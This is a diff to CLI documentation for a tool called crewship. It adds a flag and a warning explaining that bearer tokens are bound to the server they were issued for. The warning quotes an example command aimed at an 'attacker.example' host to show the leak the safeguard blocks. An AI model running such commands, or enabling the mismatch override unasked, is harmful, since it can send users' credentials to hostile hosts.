@@ -25,8 +25,21 @@ Every command inherits these persistent flags:
 | `--format` | `-f` | `string` | `table` | Output format: `table`, `json`, `yaml`, or `quiet`. |
 | `--verbose` | `-v` | `bool` | `false` | Verbose output. |
 | `--no-color` | | `bool` | `false` | Disable ANSI colors. |
+| `--server-allow-mismatch` | | `bool` | `false` | Allow sending the stored auth token to a `--server` host that differs from the one it was issued for. Also via `CREWSHIP_ALLOW_SERVER_MISMATCH` env var. |
 
 In addition: `CREWSHIP_DEFAULT_AGENT` env var sets the default agent for `crewship ask` / `crewship explain`. Resolution order: command-line flag → env var → config key.
+
+<Warning>
+**Token-host binding.** Your CLI bearer token is bound to the host it was
+issued for (the server stored in `~/.crewship/cli-config.yaml`). If `--server`
+or `CREWSHIP_SERVER` points a command at a *different* host, the CLI refuses to
+attach the token and aborts the request before it hits the network — so a
+copy-pasted `crewship --server http://attacker.example me` can never leak your
+credential to an attacker-controlled host. When you intentionally retarget
+(SSH tunnel, the server moved), either re-run `crewship login --server <url>`
+to rebind the token or pass `--server-allow-mismatch` /
+`CREWSHIP_ALLOW_SERVER_MISMATCH=1`.
+</Warning>
 
 ## Authentication
 
